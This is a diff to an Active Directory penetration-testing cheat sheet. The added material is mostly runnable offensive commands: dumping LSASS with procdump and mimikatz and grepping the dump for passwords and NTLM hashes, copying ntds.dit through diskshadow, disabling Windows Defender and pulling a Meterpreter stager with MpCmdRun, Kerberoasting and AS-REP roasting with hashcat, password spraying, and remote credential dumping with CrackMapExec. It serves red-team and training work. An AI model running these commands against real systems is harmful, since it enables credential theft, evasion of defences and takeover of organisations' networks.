@@ -559,37 +559,6 @@ PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_N
 * [activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/](https://activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/)
 * [blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
 
-Get DC names:
-
-```
-PS > nslookup -type=all _ldap._tcp.dc._msdcs.$env:userdnsdomain
-
-PS > $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
-PS > $searcher = [ADSISearcher]$ldapFilter
-PS > $searcher.FindAll()
-PS > $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() }
-Or
-PS > ([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll() |ForEach-Object { $_.GetDirectoryEntry() }
-
-PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
-
-Cmd > nltest /dsgetdc:megacorp.local
-
-PS > $DomainName = (Get-ADDomain).DNSRoot
-PS > $AllDCs = Get-ADDomainController -Filter * -Server $DomainName | Select-Object Hostname,Ipv4address,isglobalcatalog,site,forest,operatingsystem
-
-PS > $AllDCs = (Get-ADForest).GlobalCatalogs
-```
-
-Get Domain NetBIOS name:
-
-```
-PS > ([ADSI]"LDAP://megacorp.local").dc
-
-PS > $DomainName = (Get-ADDomain).DNSRoot
-PS > (Get-ADDomain -Server $DomainName).NetBIOSName
-```
-
 
 #### Misc
 
@@ -641,12 +610,21 @@ PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
 * [docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
 * [download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)
 
+Dump and parse:
+
 ```
 PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
-$ pypykatz lsa minidump lsass.dmp
+$ pypykatz lsa minidump lsass.dmp > lsass-pypykatz.minidump
 Or
 mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonPasswords full
+```
+
+Grep for secrets:
+
+```
+$ grep '* Username : ' lsass-mimikatz.minidump -A2 | grep -e Username -e Password -e NTLM | grep -v null | xclip -i -sel c
+$ grep -P '\tusername ' lsass-pypykatz.minidump -A2 | grep -e username -e password | grep -v None | xclip -i -sel c
 ```
 
 
@@ -671,6 +649,18 @@ powershell -c "Add-Content add_vol.txt 'create'"
 powershell -c "Add-Content add_vol.txt 'expose %DCROOT% w:'"
 powershell -c "Add-Content add_vol.txt 'end backup'"
 cmd /c diskshadow.exe /s add_vol.txt
+```
+
+```
+// add_vol.txt
+set context persistent nowriters
+set metadata C:\Windows\Temp\meta.cab
+set verbose on
+begin backup
+add volume c: alias DCROOT
+create
+expose %DCROOT% w:
+end backup
 ```
 
 Exfiltrate over SMB:
@@ -701,6 +691,16 @@ powershell -c "Add-Content delete_vol.txt 'unexpose w:'"
 powershell -c "Add-Content delete_vol.txt 'delete shadows volume c:'"
 powershell -c "Add-Content delete_vol.txt 'reset'"
 cmd /c diskshadow.exe /s delete_vol.txt
+```
+
+```
+// delete_vol.txt
+set context persistent nowriters
+set metadata C:\Windows\Temp\meta.cab
+set verbose on
+unexpose w:
+delete shadows volume c:
+reset
 ```
 
 Clean up:
@@ -847,6 +847,7 @@ PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
 * [hacker.house/lab/windows-defender-bypassing-for-meterpreter/](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
 * [codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/](https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/)
+* [github.com/phackt/stager.dll](https://github.com/phackt/stager.dll)
 * [hausec.com/2019/02/09/suck-it-windows-defender/]https://hausec.com/2019/02/09/suck-it-windows-defender/)
 * [medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad](https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad)
 * [medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)
@@ -920,6 +921,7 @@ $ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && 
 * [www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide)
 
 
+
 ### Out-EncryptedScript.ps1
 
 * [github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1)
@@ -938,6 +940,32 @@ PS > Out-EncryptedScript .\script.ps1 $(ConvertTo-SecureString 'Passw0rd!' -AsPl
 PS > [string] $cmd = gc .\evil
 PS > $dec = de "Passw0rd!" s4lt
 PS > Invoke-Expression $dec
+```
+
+
+
+### Tricks
+
+
+#### Windows Defender
+
+Add path to exclusions (must be elevated):
+
+```
+PS > $mimi = "C:\Users\snovvcrash\music\mimi\x64\mimikatz.exe"
+PS > Add-MpPreference -ExclusionPath $mimi -AttackSurfaceReductionOnlyExclusions $mimi
+```
+
+Remove signatures (if Internet connection is present, it will be downloaded again):
+
+```
+PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
+```
+
+Download stager with triggering Defender to scan it:
+
+```
+PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -Url http://127.0.0.1/met.exe -Path C:\Users\snovvcrash\music\met.exe
 ```
 
 
@@ -1884,21 +1912,22 @@ PS > runas /netonly /user:snovvcrash powershell
 
 ##### evil-winrm.rb
 
+* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
+* [malicious.link/post/2020/run-as-system-using-evil-winrm/](https://malicious.link/post/2020/run-as-system-using-evil-winrm/)
+
 Install:
 
 ```
-root@kali:$ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
-root@kali:$ cd ~/tools/evil-winrm && bundle install && cd -
-root@kali:$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
+$ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
+$ cd ~/tools/evil-winrm && bundle install && cd -
+$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
 ```
 
 Run:
 
 ```
-root@kali:$ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
+$ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
 ```
-
-* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
 
 ##### psexec.py
 
@@ -2249,11 +2278,20 @@ $ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > in
 PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
 ```
 
+* [github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
+* [github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)
+
+```
+$ curl -L https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Inveigh.exe > inveigh.exe
+PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
+```
+
 ##### DHCPv6
 
 mitm6.py:
 
 * [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
+* [intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
 * [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
 
 ```
@@ -2413,6 +2451,68 @@ root@kali:$ parsenmap.py -i services/alltcp-versions.xml
 
 
 
+### AD Environment Names
+
+Discover domain NetBIOS name:
+
+```
+PS > ([ADSI]"LDAP://megacorp.local").dc
+
+PS > $DomainName = (Get-ADDomain).DNSRoot
+PS > (Get-ADDomain -Server $DomainName).NetBIOSName
+```
+
+Discover DCs' FQDN names:
+
+```
+PS > nslookup -type=all _ldap._tcp.dc._msdcs.$env:userdnsdomain
+
+PS > $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
+PS > $searcher = [ADSISearcher]$ldapFilter
+PS > $searcher.FindAll()
+PS > $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() }
+Or
+PS > ([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll() |ForEach-Object { $_.GetDirectoryEntry() }
+
+PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
+
+Cmd > nltest /dsgetdc:megacorp.local
+
+PS > $DomainName = (Get-ADDomain).DNSRoot
+PS > $AllDCs = Get-ADDomainController -Filter * -Server $DomainName | Select-Object Hostname,Ipv4address,isglobalcatalog,site,forest,operatingsystem
+
+PS > $AllDCs = (Get-ADForest).GlobalCatalogs
+
+PowerView3 > Get-DomainController | Select Name,IPAddress
+```
+
+Discover MS Exchnage servers' FQDN names:
+
+* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers)
+
+```
+$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSExchangeServers > discover-exch.ps1
+PS > Discover-PSMSExchangeServers | Select ServerName,Description | Tee-Object exch.txt
+```
+
+
+Discover MS SQL servers' FQDN names:
+
+* [github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
+* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)
+
+```
+$ curl -L https://github.com/NetSPI/PowerUpSQL/raw/master/PowerUpSQL.ps1 > powerupsql.ps1
+PS > Get-SQLInstanceDomain
+PS > Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10 -UserName sa -Password 'Passw0rd!' -Verbose
+PS > Invoke-SQLOSCmd -UserName sa -Password 'Passw0rd!' -Instance sqlsrv01.megacorp.local -Command whoami
+
+$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSSQLServers > discover-mssql.ps1
+PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.txt
+```
+
+
+
 ### LHF Exploits & Checkers
 
 
@@ -2547,6 +2647,7 @@ Top UDP ports:
 
 ```
 $ sudo masscan --rate=500 --open -p22,80,443,U:161,U:500 -iL routes.txt --resume paused.conf >> alltcp.txt
+$ mkdir services && for p in 21 22 23 25 53 80 88 111 135 137 139 161 389 443 445 464 500 593 636 873 1099 1433 1521 2049 3268 3269 3306 3389 4786 5432 5555 5900 5985 5986 6379 8080 9389 9200 27017; do grep "port $p/tcp" alltcp.txt | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
 ```
 
 
@@ -2695,6 +2796,10 @@ $ sudo neo4j start
 $ wget https://github.com/BloodHoundAD/BloodHound/releases/latest
 $ unzip BloodHound-linux-x64.zip && rm BloodHound-linux-x64.zip && cd BloodHound-linux-x64
 $ sudo ./BloodHound --no-sandbox
+Or
+$ sudo chown root:root chrome-sandbox
+$ sudo chmod 4755 chrome-sandbox
+$ ./BloodHound
 ```
 
 ##### SharpHound.ps1
@@ -2716,6 +2821,10 @@ $ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd 
 $ bloodhound-python -c All -u snovvcrash -p 'Passw0rd!' -d MEGACORP.LOCAL -ns 127.0.0.1
 ```
 
+##### Cypher
+
+* [hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
+
 
 #### Impacket
 
@@ -2724,6 +2833,17 @@ $ bloodhound-python -c All -u snovvcrash -p 'Passw0rd!' -d MEGACORP.LOCAL -ns 12
 ```
 $ git clone https://github.com/SecureAuthCorp/impacket
 $ sudo python -m pip install --upgrade .
+```
+
+```
+$ lookupsid.py MEGACORP/s.freeside:'Passw0rd!'@127.0.0.1 20000
+
+$ GetUserSPNs.py MEGACORP/s.freeside:'Passw0rd!' -dc-ip 127.0.0.1 -save
+$ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash hashes/asprep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
+
+$ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -k -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.txt | tee GetNPUsers.log
+$ cat GetNPUsers.log | grep -v 'Client not found in Kerberos database'
+$ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash hashes/asprep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
 
@@ -2743,12 +2863,15 @@ $ pipenv install && pipenv shell
 Use:
 
 ```
-$ crackmapexec smb 127.0.0.1
-$ crackmapexec smb 127.0.0.1 -u anonymous -p '' --shares
-$ crackmapexec smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
-$ crackmapexec smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
-$ crackmapexec smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
-$ crackmapexec smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
+$ CME smb 127.0.0.1
+$ CME smb 127.0.0.1 -u anonymous -p '' --shares
+$ CME smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+$ CME smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
+$ CME smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
+$ CME smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
+$ CME smb 127.0.0.1 -u snovvcrash -p '' --local-auth --sam
+$ CME smb 127.0.0.1 -u snovvcrash -p '' -M mimikatz
+$ CME smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
 ```
 
 
